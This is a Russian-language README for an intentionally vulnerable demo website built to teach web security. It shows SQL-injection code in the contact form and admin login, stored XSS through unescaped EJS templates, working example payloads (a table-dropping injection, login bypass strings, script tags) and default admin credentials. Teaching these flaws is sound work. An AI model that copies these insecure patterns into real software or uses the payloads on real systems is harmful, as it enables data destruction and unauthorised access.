# КодЛаб — Демонстрационное уязвимое приложение

⚠️ **ВНИМАНИЕ**: Это приложение содержит **намеренные уязвимости** **Не используйте в продакшене!**

## О проекте

Стильный сайт-визитка веб-студии с:

- Главной страницей с описанием услуг
- Формой обратной связи (email + сообщение)
- Секцией отзывов (имя + текст)
- Админ-панелью для просмотра заявок и отзывов

## Уязвимости для демонстрации

### 1. SQL Injection — Форма обратной связи

**Где:** POST `/contact`

**Уязвимый код:**

```typescript
const query = `INSERT INTO contacts (email, message) VALUES ('${email}', '${message}')`
db.exec(query)
```

**Пример эксплуатации:**

```
Email: test@test.com', ''); DROP TABLE contacts; --
```

### 2. SQL Injection — Авторизация в админке

**Где:** POST `/admin/login`

**Уязвимый код:**

```typescript
const query = `SELECT * FROM admins WHERE username = '${username}' AND password = '${password}'`
```

**Пример эксплуатации (обход авторизации):**

```
Логин: admin' --
Пароль: anything
```

или

```
Логин: ' OR '1'='1' --
Пароль: anything
```

### 3. XSS (Cross-Site Scripting) — Отзывы

**Где:** Форма отзывов, отображение на главной и в админке

**Уязвимый код (EJS шаблон):**

```ejs
<%- review.name %>   <!-- Без экранирования -->
<%- review.text %>   <!-- Без экранирования -->
```

**Пример эксплуатации:**

```
Имя: <script>alert('XSS')</script>
Отзыв: <img src=x onerror="alert('Hacked!')">
```

## Быстрый старт

### Вариант 1: Локальный запуск

```bash
# Запуск
npm run dev
```

### Вариант 2: Docker

```bash
# Запуск через Docker
docker-compose up --build
```

## Доступ

- **Сайт:** http://localhost:3000
- **Админ-панель:** http://localhost:3000/admin/login
- **Логин/пароль:** admin / supersecret123

## Технологии

- Node.js + Express + TypeScript
- EJS (шаблонизатор)
- SQLite (better-sqlite3)
- Tailwind CSS (через CDN)
- Docker + Docker Compose

## Структура проекта

```
worst-web-app/
├── src/
│   └── app.ts           # Основной код сервера
├── views/
│   ├── index.ejs        # Главная страница
│   ├── admin-login.ejs  # Страница входа
│   └── admin-dashboard.ejs  # Админ-панель
├── public/              # Статические файлы
├── Dockerfile
├── docker-compose.yml
├── tsconfig.json
├── init.sh              # Скрипт инициализации
└── README.md
```

---

**Создано для демонстрационных целей. Не используйте в реальных проектах!**
